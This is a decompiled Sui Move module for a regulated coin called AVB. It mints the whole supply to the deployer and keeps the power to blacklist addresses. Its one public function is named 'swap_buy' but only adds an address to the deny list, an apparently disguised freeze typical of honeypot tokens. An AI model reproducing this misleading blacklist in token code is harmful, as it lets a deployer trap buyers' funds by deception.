module 0xf8dc4d31954783d9b7fdc5a422b1370fd88170a0593cf14065d06b950eaeaa41::avb {
    struct AVB has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: AVB, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AVB>(arg0, 9, b"AVB", b"Autonomous Virtual Beings ", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQxhFrdSo1rZj9bP7DQXPKi42bF2HLyG2Ds5LTmVZ8JJi"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<AVB>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AVB>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<AVB>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AVB>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AVB>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AVB>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

